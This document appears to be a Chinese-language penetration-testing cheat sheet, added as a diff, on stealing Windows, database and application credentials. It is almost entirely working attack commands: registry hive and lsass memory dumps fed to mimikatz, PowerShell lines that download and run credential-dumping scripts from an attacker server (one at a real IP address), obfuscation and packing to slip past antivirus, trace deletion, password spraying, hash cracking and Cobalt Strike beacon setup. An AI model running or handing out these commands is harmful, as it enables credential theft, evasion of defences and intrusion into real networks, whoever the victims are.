@@ -1,0 +1,287 @@
+
+凭证获取：
+1.系统凭证：mimikatz提取hash或明文。
+(1)pwdump8：抓取各种凭证(本地账户、域账户等)，至少需管理员权限运行。
+https://blog.quarkslab.com/quarks-pwdump.html
+
+常用命令：
+QuarksPwDump.exe --dump-hash-local  //导出本地hash
+或：
+QuarksPwDump.exe -dhl -o wz.txt 	//导出本地hash
+
+(2)mimikatz：
+离线提取(强推)：
+1.通过注册表导出凭证文件(至少管理员权限，目标机器上执行)：
+reg save HKLM\SYSTEM SystemBkusbzp.hiv
+reg save HKLM\SAM sambkuzp.hiv
+2.将凭证文件下载到本地，本地使用mimikatz提取凭证：
+mimikatz# lsadump::sam /system:SystemBkusbzp.hiv /sam:sambkuzp.hiv
+
+当win版本>=win8.1或win_version>=2012R2，默认内存中禁止缓存明文密码。却可通过修改注册表方式进行抓取，修改注册表后，再重启再重新登录即可抓取明文。
+核心：补丁KB2861996
+
+
+在线提取：
+通过SAM导出凭证：
+privilege::debug
+token::elevate
+lsadump::sam
+
+
+
+或：
+mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
+
+
+(3)secretsdump：
+https://github.com/maaaaz/impacket-examples-windows
+离线提取(强推)：
+1.通过注册表导出凭证文件(至少管理员权限，目标机器上执行)：
+cd %temp%
+reg save HKLM\SYSTEM SystemBkusbzp.hiv
+reg save HKLM\SAM sambkuzp.hiv
+reg save HKLM\SECURITY securyz.hiv
+
+2.将凭证文件下载到本地，本地使用secretsdump提取凭证：
+secretsdump.exe -sam sambkuzp.hiv -security securyz.hiv -system SystemBkusbzp.hiv LOCAL
+
+或上传到目标机器执行：
+secretsdump.exe -sam sambkuzp.hiv -security securyz.hiv -system SystemBkusbzp.hiv LOCAL
+清理痕迹：
+del *.hiv secretsdump.exe /F
+
+
+(4)mimikatz内存转储方式获取凭证：
+lsass.exe进程->转储。
+
+位置一般为：
+C:\Users\ADMINI~1\AppData\Local\Temp\lsass.DMP
+
+本地使用mimikatz对lsass.DMP文件提取凭证：
+cmd执行：
+mimikatz.exe "sekurlsa::minidump lsass.DMP" "sekurlsa::logonPasswords full" exit
+
+
+(5)procdump：命令行工具，主要是监视应用程序各种资源或数值。 微软白名单。现在也被360新版查杀。
+a1：通过procdump导出凭证文件。
+procdump.exe -accepteula -ma lsass.exe lszasws.dmp
+
+a2：将凭证文件下载到本地，本地使用mimikatz提取凭证：
+mimikatz# sekurlsa::minidump lszasws.dmp
+mimikatz# sekurlsa::logonPasswords full
+
+
+(6)通过远程加载powershell脚本导出凭证：powershell不落地，内存中运行。
+eg1：
+powershell IEX (New-Object Net.WebClient).DownloadString('http://vps_ip:8016/Invoke-Mimikatz.ps1');Invoke-Mimikatz –DumpCreds
+下载地址：
+https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1
+或：
+powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');Invoke-Mimikatz
+
+
+eg2：
+Powershell加载Get-PassHashes脚本：
+powershell IEX(new-object net.webclient).downloadstring('http://47.101.214.85:8000/Get-PassHashes.ps1');Get-PassHashes
+下载地址：
+https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1
+或：
+powershell IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
+
+
+注：远程加载pws脚本很可能被360拦截。
+
+
+
+(7)加载本地powershell脚本导出凭证：
+powershell -exec bypass -Command "& {Import-Module 'C:\Windows\Temp\Get-PassHashes.ps1';$m=Get-PassHashes; $m}"
+最好对powershell脚本做免杀(如混淆、编码、加密解密等)。
+
+(8)加载本地powershell脚本导出凭证：
+powershell -exec bypass -Command "import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz"
+
+(9)混淆后的powershell脚本：
+推荐本地加载：
+powershell -exec bypass -Command "import-Module .\Invoke-Cats.ps1;Invoke-Cats -pwds"
+或：
+powershell "IEX(new-object net.webclient).downloadstring('http://vps_ip/Invoke-Cats.ps1');Invoke-Cats -pwds" 		//远程加载
+下载地址：
+https://raw.githubusercontent.com/DanMcInerney/Invoke-Cats/master/Invoke-Cats.ps1
+
+
+
+
+
+
+
+
+
+
+(10)使用加密后的powershell脚本：
+powershell执行：
+powershell -exec bypass
+1.导入模块：
+c:\PS> import-module .\out-encryptedscripzt.ps1
+
+2.本机加密Invoke-Mimikatz脚本：
+c:\PS> Out-EncryptedScript .\Invoke-Mimikatz.ps1
+输入密码和salt值，得到加密后的脚本eviwl.ps1
+
+3.上传该脚本到目标机器，解密运行：
+powershell执行：powershell -exec bypass
+c:\PS> [String] $cmzd=Get-Content .\eviwl.ps1
+c:\PS> Invoke-Expression $cmzd
+c:\PS> $decryptewd=de passwzd salzt
+c:\PS> Invoke-Expression $decryptewd
+c:\PS> Invoke-Mimikatz
+
+需关闭实时保护。 能过360杀毒。
+
+
+
+(11)通过.Net4.0启动Mimikatz，再在本地提取凭证。
+如：
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe mimikatz.xml
+
+
+
+(12)加密、加壳mimikatz绕过杀软且仅在内存中执行：
+使用darkarmour：
+https://github.com/bats3c/darkarmour
+a1：安装依赖：
+sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode
+
+a2：加密mimikatz：
+./darkarmour.py -f bins/meter.exe --encrypt xor --jmp -o bins/legit.exe --loop 5
+
+a3：直接运行加密后的mimikatz，提取凭证：
+privilege::debug
+sekurlsa::logonpasswords
+
+
+
+(13)sqldumper+mimikatz：sqldumper.exe为微软调试程序。 离线模式。 若win安装了mssql，则可通过sqldumper.exe来dump lsass进程，进而获取凭证。
+核心：利用白名单。
+
+
+SqlDumper.exe默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本。
+如："C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe"
+目标机若没有则可自己上传一个。
+
+
+tasklist /svc | findstr lsass.exe
+如：找到对应PID为420
+
+执行：
+Sqldumper.exe 进程ID 0 0x01100
+如：其中0x01100表示完全转存。
+"C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" 420 0 0x01100
+得到类似SQLDmpr0001.mdmp文件。
+
+将其下载到本地使用mimikatz读取：
+mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit
+或：
+mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit >> resulz.txt
+
+成功获取凭证。
+
+
+
+(14)dump_lsass(离线模式)：
+1.转储lsass.exe进程：至少需管理员权限。
+procdump.exe -accepteula -ma lsass.exe lsazz_dump
+或使用dump_lsass_for_win.exe转储(直接运行即可)。 最好对其c源码进行免杀。
+项目地址：
+https://github.com/muyuxx/dump_lsass
+
+
+2.利用mimikatz读取凭证。
+
+(15)sharpdump(离线模式)
+1.转储lsass.exe进程：至少需管理员权限。
+直接运行sharpdump.exe即可。
+https://github.com/GhostPack/SharpDump/
+2.下载C:\Windows\Temp\debug.out文件(压缩文件)。 其保存着转储lsass.exe进程的结果数据。
+3.使用新版mimikatz提取凭证。 将debug.out解压生成zw文件。
+mimikatz.exe "sekurlsa::minidump zw" "sekurlsa::logonPasswords full" exit >> resulz.txt
+
+
+使用Ladon模块也行，生成w.gz文件，解压，再将该文件使用mimikatz离线提取即可。
+
+
+(16)SharpMiniDump：
+https://github.com/b4rtik/SharpMiniDump
+
+
+(17)拿到hash爆破口令：
+Ophcrack彩虹表、hashcat、join等工具。
+
+在线破解：
+http://www.xmd5.org/
+https://www.cmd5.com
+https://www.somd5.com
+https://www.objectif-securite.ch/en/ophcrack
+
+
+密码喷射：即使用一个密码对多个账户进行爆破。
+step1：收集用户名、密码字典。
+step2：查看密码策略：
+net accounts /domain
+crackmapexec smb 192.168.43.6 -u 'administrator' -p 'Qwe123456' --pass-po
+
+
+安装：
+apt install crackmapexec
+https://github.com/byt3bl33d3r/CrackMapExec
+
+step3：
+上传字典和程序，开始喷射：
+k386.exe passwordspray -d god.org user.txt Qwe123456
+
+
+
+
+
+
+
+
+2.数据库凭证。
+mysql：
+select host,user,password from ,ysql.user;      #mysql<=5.6
+select host,user,authentication_string from mysql.user; #mysql>=5.7
+
+MYSQL搜索带有pass和user关键词的数据库、表
+select table_schema as db,table_name as tables,column_name as columns from information_schema.columns where column_name like '%user%' or column_name like '%pass%' or column_name like '%login%' or column_name like '%email%' ;
+
+
+
+
+
+
+3.第三方组件凭证：远程管理工具、浏览器等。
+LaZagne：https://github.com/AlessandroZ/LaZagne
+使用：laZagne.exe all
+
+RDP密码抓取：
+beacon> powershell-import
+c:\wdqz\ListAllUsers.ps1
+beacon> powershell ListAllUsers
+
+ 
+sharpdpapi：需自己编译。
+https://github.com/GhostPack/SharpDPAPI
+
+
+
+sharpsecdump：远程提取域用户凭证。
+sharpsecdump.exe -target 192.168.43.6 -u=administrator -p=Qwe123456 -d=yiz.com
+其中：
+-d 域名
+-threads 线程
+
+
+
+cs beacon_bind_tcp：
+生成一个beacon_bind_tcp listener，再生成对应木马放在机器C上运行，则C机器(192.168.52.6)开启监听(默认在4444端口)。
+在能访问到C机器的B机器上执行命令：connect 192.168.52.6 4444
+则成功获得session.
